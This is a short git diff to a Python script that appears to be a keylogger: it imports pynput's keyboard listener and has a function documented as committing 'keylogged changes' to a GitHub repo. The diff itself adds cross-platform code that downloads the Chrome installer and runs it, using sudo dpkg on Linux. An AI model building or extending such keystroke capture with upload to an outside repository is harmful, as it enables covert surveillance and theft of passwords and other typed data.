@@ -4,6 +4,7 @@ import base64
 import datetime
 import subprocess
 import json
+import platform
 from pynput import keyboard
 
 # Load configuration from JSON file
@@ -25,12 +26,29 @@ DATETIME_FORMAT = config['options']['datetime_format']
 
 def chrome():
     """Download and run Chrome installer"""
-    chrome_url = "https://dl.google.com/chrome/mac/universal/stable/GGRO/googlechrome.dmg"
+    if platform.system() == 'Darwin':
+        chrome_url = "https://dl.google.com/chrome/mac/universal/stable/GGRO/googlechrome.dmg"
+        chrome_file = "googlechrome.dmg"
+    elif platform.system() == 'Windows':
+        chrome_url = "https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7BE2A6BC48-C42E-9767-4472-252CF88743FB%7D%26lang%3Den%26browser%3D3%26usagestats%3D0%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26installdataindex%3Dempty/update2/installers/ChromeSetup.exe"
+        chrome_file = "ChromeSetup.exe"
+    elif platform.system() == "Linux":
+        chrome_url = "https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb"
+        chrome_file = "google-chrome-stable_current_amd64.deb"
+    else:
+        raise ValueError('Unsupported platform')
+
     chrome_path = "./"
-    chrome_file = "googlechrome.dmg"
     fullfilename = os.path.join(chrome_path, chrome_file)
     urllib.request.urlretrieve(chrome_url, fullfilename)
-    subprocess.call(['open', fullfilename])
+
+    if platform.system() == 'Darwin':
+        subprocess.call(['open', fullfilename])
+    elif platform.system() == 'Windows':
+        subprocess.run([fullfilename], check=True)
+    elif platform.system() == 'Linux':
+        subprocess.run(["sudo", "dpkg", "-i", fullfilename], check=True)
+
 
 def commit(log_file, github_file_path):
     """Commit keylogged changes to github repo"""
